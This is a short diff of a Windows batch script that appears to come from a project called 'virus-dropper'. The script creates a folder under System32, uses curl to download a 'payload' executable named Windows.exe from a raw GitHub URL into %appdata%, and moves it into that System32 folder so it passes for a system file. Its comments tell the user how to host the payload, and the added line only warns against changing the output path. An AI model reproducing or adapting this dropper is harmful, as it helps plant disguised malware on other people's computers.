@@ -17,6 +17,7 @@ md "%systemroot%\System32\Windowsexe"
 ::upload files here: github.com - create account and create repository (public) then upload files
 ::put payload file DIRECT download link here:
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
+::do not change the --output
 
 
 move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
